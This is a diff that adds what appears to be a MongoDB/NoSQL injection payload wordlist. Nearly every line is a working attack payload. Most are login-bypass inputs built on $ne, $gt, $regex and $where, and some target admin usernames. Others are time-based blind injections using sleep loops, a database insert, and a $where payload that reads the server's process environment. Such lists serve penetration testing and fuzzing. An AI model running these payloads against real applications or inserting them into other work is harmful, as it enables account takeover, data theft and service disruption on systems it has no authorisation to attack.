@@ -1,0 +1,434 @@
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+', $where: '1 == 1
+1, $where: '1 == 1'
+{ $ne: 1 }
+', $or: [ {}, { 'a':'a
+' } ], $comment:'successful MongoDB injection'
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+|| 1==1
+|| 1==1//
+|| 1==1%00
+}, { password : /.*/ }
+' && this.password.match(/.*/)//+%00
+' && this.passwordzz.match(/.*/)//+%00
+'%20%26%26%20this.password.match(/.*/)//+%00
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+{$gt: ''}
+[$ne]=1
+';sleep(5000);
+';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
+{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
+{"username": {"$gt":""}, "password": {"$gt":""}}
+{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
+$gt 
+$ne
+$nin
+$where: '1 == 1'
+' && this.password.match(/.*/)//+%00
+' && this.passwordzz.match(/.*/)//+%00
+' || 'a'=='a
+' } ], $comment:'successful MongoDB injection'
+'%20%26%26%20this.password.match(/.*/)//+%00
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+', $or: [ {}, { 'a':'a
+', $where: '1 == 1
+', $where: '1 == 1'
+';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
+';sleep(5000);
+';sleep(5000);'
+';sleep(5000);+'
+, $where: '1 == 1'
+1, $where: '1 == 1'
+[$ne]=1
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+true, $where: '1 == 1'
+{ $ne: 1 }
+{"$gt": ""}
+{"$gt":""}
+{"$gt":-1}
+{"$ne":""}
+{"$ne":-1}
+{"$nin":1}
+{"$nin":[1]}
+{"$where":  "sleep(1000)"}
+{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
+{"username": {"$gt":""}, "password": {"$gt":""}}
+{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
+{$gt: ''}
+{$nin: [""]}}
+|| 1==1
+|| 1==1%00
+|| 1==1//
+}, { password : /.*/ }
+{"username": {"$ne": null},"password": {"$ne": null}}
+{$where: "this.username && this.username[0] == 'a'"}
+{$where: "this.username && this.username.length == 5"}
+{$where: "this.username && this.username.indexOf('dmin') > -1"}
+admin' || 1==1 || 'a'=='b
+admin' && this.password!='' && 'a'=='a
+{"$where": "Object.keys(this)[0].length > 0"}
+'; return true; var x='
+{'username': {'$ne': ''}}
+(`username`: (`$ne`: ``))
+【username】: 【$ne】: 【】
+｛username｝: ｛$ne｝: ｛｝
+ {'$ne': ''}
+ ((`$ne`: ``)
+ 【$ne】: 【】
+ ｛$ne｝: ｛｝
+%27%20%7C%7C%20%271%27%3D%3D%271%27
+%27%20%26%26%20this.password.match%28%2F.*%2F%29%2F%2F%2B%2500
+%7B%22%24ne%22%3A%201%7D
+%7B%22username%22%3A%20%7B%22%24ne%?username=admin&password[$ne]=
+?username[$ne]=&password[$ne]=
+?username=admin&password[$regex]=.*
+?username[$regex]=.*&password[$regex]=.*22%3A%20%22%22%7D%7D
+admin'//
+admin'%00
+admin'||'a'=='a
+admin'&&'b'=='b
+admin' || 'x'='x
+admin' && this.password!=''
+{$where: "Object.keys(this).length > 0"}
+{$where: "JSON.stringify(this).includes('admin')"}
+{$where: "this.constructor.constructor('return process')().env"}
+ "Object.keys(this).length > 0"
+ "JSON.stringify(this).includes('admin')"
+ "this.constructor.constructor('return process')().env"
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+db.users.find({$where: "sleep(100)"})
+admin\x00
+admin\x00' || 1==1//
+\x00' || 1==1//
+', $comment: 'Injected'
+", $comment: 'Injected'
+admin' && 1==1// comment
+admin' || 1==1/* comment */
+{ $where: "this[Object.keys(this)[0]] != ''" }
+{ $where: "for(var key in this) { return true; }" }
+ "this[Object.keys(this)[0]] != ''" 
+ "for(var key in this) { return true; }" 
+{'username': {'$ne': ''}}
+{"username": {"$not": {"$eq": ""}}}
+{"username": {"$exists": true, "$ne": null}}
+{"username": {"$type": 2, "$ne": ""}}
+{"username": {"$mod": [1,0]}}
+{"username": {"$size": 1}}
+ {'$ne': ''}
+ {"$not": {"$eq": ""}}
+ {"$exists": true, "$ne": null}
+ {"$type": 2, "$ne": ""}
+ {"$mod": [1,0]}
+ {"$size": 1}
+\x16\x00\x00\x00\x02admin\x00\x06\x00\x00\x00admin\x00\x00
+{"username": "admin", "$where": "1"}
+{"username": "admin", "password": {"$ne": ""}}
+{"username": "admin", "password": {"$regex": ".*"}}
+{"$where": "this.username == 'admin' && this.password == 'password'"}
+ "admin", "$where": "1"
+ "admin", "password": {"$ne": ""}
+ "admin", "password": {"$regex": ".*"}
+ "this.username == 'admin' && this.password == 'password'"
+{"username": {"$in": ["Admin", "4dm1n", "admin", "root", "administrator"]}, "password": {"$gt": ""}}
+{"username": {"$nin": ["", null]}, "password": {"$ne": ""}}
+{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
+{"username": {"$gt":""}, "password": {"$gt":""}}
+{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
+ {"$in": ["Admin", "4dm1n", "admin", "root", "administrator"]}, "password": {"$gt": ""}
+ {"$nin": ["", null]}, "password": {"$ne": ""}
+ {"$gt": undefined}, "password": {"$gt": undefined}
+ {"$gt":""}, "password": {"$gt":""}
+ {"$ne": "invalid"}, "password": {"$ne": "invalid"}
+{"username": {"$regex": ".*"}}
+{"username": {"$regex": "^.*$"}}
+{"username": {"$regex": "admin"}}
+{"password": {"$regex": ".*"}}
+{"username": {"$options": "i", "$regex": "ADMIN"}}
+{"username": /.*/}
+{"username": /admin/i}
+{"username": {"$regex": "a", "$options": "i"}}
+', $or: [ {}, { 'a':'a' } ], $comment:'successful MongoDB injection'
+' || '1'=='1' || '
+' && this.password.match(/.*/)//+%00
+' && this.passwordzz.match(/.*/)//+%00
+'%20%26%26%20this.password.match(/.*/)//+%00
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+{"$or": [{"username": "admin"}, {"password": {"$ne": ""}}]}
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
+{"$and": [{"username": {"$ne": ""}}, {"password": {"$ne": ""}}]}
+{"$nor": [{"username": "wrong"}, {"password": "wrong"}]}
+{"$not": {"username": "wrong"}}
+{ $ne: 1 }
+{ $ne: null }
+{ $ne: "" }
+{ $ne: "admin" }
+{ $gt: "" }
+{ $gt: null }
+{ $gte: 0 }
+{ $lt: 999999 }
+{ $nin: [] }
+{ $in: ["admin"] }
+{"$ne": ""}
+{"$exists": true}
+{"$exists": false}
+{"$type": 2}
+{"$regex": ".*"}
+true, $where: '1 == 1'
+', $where: '1 == 1'
+1, $where: '1 == 1'
+{$where: '1 == 1'}
+|| 1==1
+|| 1==1//
+|| 1==1%00
+' || '1'=='1
+' || 1==1//
+' || 1==1%00
+" || 1==1//
+" || 1==1%00
+' || 'a'=='a
+' || 'x'=='x
+' || 'admin'=='admin'
+' || 'admin'!='user'
+' || this.username!=''
+' || this.username.length>0
+' || typeof this.username!='undefined'
+' || Object.keys(this).length>0
+' || JSON.stringify(this)!='{}'
+' || 1===1//
+' || 1!==0//
+' || NaN!=NaN//
+' || Infinity==Infinity//
+' || null==undefined//
+' || !false//
+' || !!true//
+' || 1||1//
+' || 0||1//
+' || -1==-1//
+' || 0x1==1//
+' || 1e0==1//
+' || 1.0==1//
+' || +1==1//
+' || ~-2==1//
+' || 1<<0==1//
+' || 1>>0==1//
+' || 1>>>0==1//
+' || 1&1==1//
+' || 1|0==1//
+' || 1^0==1//
+' || (1)==1//
+' || [1]==1//
+' || {valueOf:()=>1}==1//
+' || Math.sqrt(1)==1//
+' || Math.pow(1,1)==1//
+' || Number('1')==1//
+' || parseInt('1')==1//
+' || parseFloat('1.0')==1//
+' || String(1)=='1'//
+' || Boolean(1)==true//
+' || Array.isArray([])//
+' || isNaN(NaN)//
+' || isFinite(1)//
+' || decodeURI('%31')==1//
+{$ne: 1}
+{$ne: 0}
+{$ne: -1}
+{$ne: null}
+{$ne: undefined}
+{$ne: ""}
+{$ne: []}
+{$ne: {}}
+{$ne: false}
+{$ne: true}
+{$ne: NaN}
+{$ne: Infinity}
+{$gt: ""}
+{$gt: null}
+{$gt: -Infinity}
+{$gt: new Date(0)}
+{$gt: new Date('1970-01-01')}
+{$gt: ISODate('1970-01-01')}
+{$gt: ObjectId('000000000000000000000000')}
+{$gte: 0}
+{$gte: ""}
+{$gte: []}
+{$gte: {}}
+{$lt: 9999999999}
+{$lt: new Date()}
+{$lt: new Date('2099-12-31')}
+{$lt: ObjectId('ffffffffffffffffffffffff')}
+{$lte: 9999999999}
+{$lte: [9999999999]}
+{$nin: []}
+{$nin: [""]}
+{$nin: [null]}
+{$nin: [undefined]}
+{$nin: [false]}
+{$in: ["admin"]}
+{$in: ["admin", "root"]}
+{$in: [1,2,3]}
+{$in: [/admin/]}
+{$in: [{$regex: ".*"}]}
+{$exists: true}
+{$exists: false}
+{$exists: 1}
+{$exists: 0}
+{$type: 2}  // string
+{$type: 1}  // double
+{$type: 16} // int32
+{$type: 8}  // boolean
+{$type: 9}  // date
+{$type: 3}  // object
+{$type: 4}  // array
+{$type: 7}  // ObjectId
+{$type: 10} // null
+{$type: 11} // regex
+{$type: 13} // javascript
+{$type: 18} // binData
+{$type: -1} // minKey
+{$type: 127} // maxKey
+{$not: {$eq: ""}}
+{$not: {$ne: "admin"}}
+{$not: {$regex: "^wrong"}}
+{$elemMatch: {$ne: ""}}
+{$all: [""]}
+{$size: 0}
+{$size: 1}
+{$size: {$gt: 0}}
+{$mod: [1,0]}
+{$mod: [2,0]}
+{$mod: [100,0]}
+{$bitsAllSet: 1}
+{$bitsAnySet: 1}
+{$bitsAllClear: 0}
+{$bitsAnyClear: 0}
+{$regex: ".*"}
+{$regex: "^.*$"}
+{$regex: ""}
+{$regex: ".?"}
+{$regex: ".+"}
+{$regex: ".{0,}"}
+{$regex: "\\w*"}
+{$regex: "\\d*"}
+{$regex: "\\s*"}
+{$regex: "[\\s\\S]*"}
+{$regex: "(?s).*"}
+{$regex: "[\x00-\x7F]*"}
+{$regex: "[^]*"}
+{$regex: "^(?=.*)"}
+{$regex: "admin.*"}
+{$regex: ".*admin.*"}
+{$regex: "^admin"}
+{$regex: "admin$"}
+{$regex: "a.*d.*m.*i.*n"}
+{$regex: "[aA][dD][mM][iI][nN]"}
+{$options: "i", $regex: "ADMIN"}
+{$options: "m", $regex: "^admin"}
+{$options: "s", $regex: ".*"}
+{$options: "x", $regex: "admin"}
+{$options: "is", $regex: ".*"}
+{$options: "im", $regex: ".*"}
+{$options: "ims", $regex: ".*"}
+{$options: "imxs", $regex: ".*"}
+/regex/i
+/regex/im
+/regex/ims
+/regex/imxs
+/^admin$/i
+/^admin$/m
+/^admin$/s
+/^admin$/is
+/^admin$/im
+/^admin$/ims
+{$regex: Buffer.from(".*")}
+{$regex: new RegExp(".*")}
+{$regex: new RegExp(".*", "i")}
+{$regex: RegExp(".*")}
+{$regex: /.*/}
+{$regex: /.*/i}
+{$regex: /.*/im}
+{$regex: /.*/ims}
+{$regex: /.*/gim}
+{$regex: /.*/y}
+{$regex: /.*/u}
+{$regex: /.*/d}
+{$regex: /[\w\W]*/}
+{$regex: /[\d\D]*/}
+{$regex: /[\s\S]*/}
+{$regex: /[^]*/}
+{$regex: /(?s).*/}
+{$regex: /(?i)admin/}
+{$regex: /(?im)admin/}
+{$where: "1 == 1"}
+{$where: "1 === 1"}
+{$where: "true"}
+{$where: "!!1"}
+{$where: "!0"}
+{$where: "!![]"}
+{$where: "!{}==false"}
+{$where: "this"}
+{$where: "this != null"}
+{$where: "this.username"}
+{$where: "this.username != ''"}
+{$where: "this.username.length > 0"}
+{$where: "this.username && this.password"}
+{$where: "typeof this.username != 'undefined'"}
+{$where: "this.username !== undefined"}
+{$where: "this.username !== null"}
+{$where: "this.username != null"}
+{$where: "this.username != undefined"}
+{$where: "Object.keys(this).length > 0"}
+{$where: "JSON.stringify(this).length > 2"}
+{$where: "this.constructor == Object"}
+{$where: "this.valueOf()"}
+{$where: "this.toString()"}
+{$where: "String(this)"}
+{$where: "Number(this)"}
+{$where: "Boolean(this)"}
+{$where: "Array.isArray(this)"}
+{$where: "this instanceof Object"}
+{$where: "this.hasOwnProperty('username')"}
+{$where: "'username' in this"}
+{$where: "for(var key in this) return true"}
+{$where: "Object.getOwnPropertyNames(this).length > 0"}
+{$where: "Reflect.ownKeys(this).length > 0"}
+{$where: "Object.values(this).length > 0"}
+{$where: "Object.entries(this).length > 0"}
+{$where: "this.username == 'admin'"}
+{$where: "this.username === 'admin'"}
+{$where: "this.username.indexOf('admin') != -1"}
+{$where: "this.username.includes('admin')"}
+{$where: "this.username.startsWith('admin')"}
+{$where: "this.username.endsWith('admin')"}
+{$where: "this.username.match(/admin/)"}
+{$where: "this.username.search(/admin/) != -1"}
+{$where: "this.username.replace(/.*/, '') == ''"}
+{$where: "this.username.split('').length > 0"}
+{$where: "this.username.charCodeAt(0) > 0"}
+{$where: "this.username.codePointAt(0)"}
+{$where: "this.username.normalize()"}
+{$where: "this.username.localeCompare('admin')"}
+{$where: "this.username.trim()"}
+{$where: "this.username.toUpperCase()"}
+{$where: "this.username.toLowerCase()"}
+
+
+
+
+#Time Based
+';sleep(5000);
+';sleep(5000)//
+';sleep(5000)||'
+';it=new Date();do{pt=new Date();}while(pt-it<5000);
+{$where: "sleep(5000) || true"}
+';for(var i=0;i<1e8;i++){}//
+';var d=new Date();while((new Date())-d<5000){}
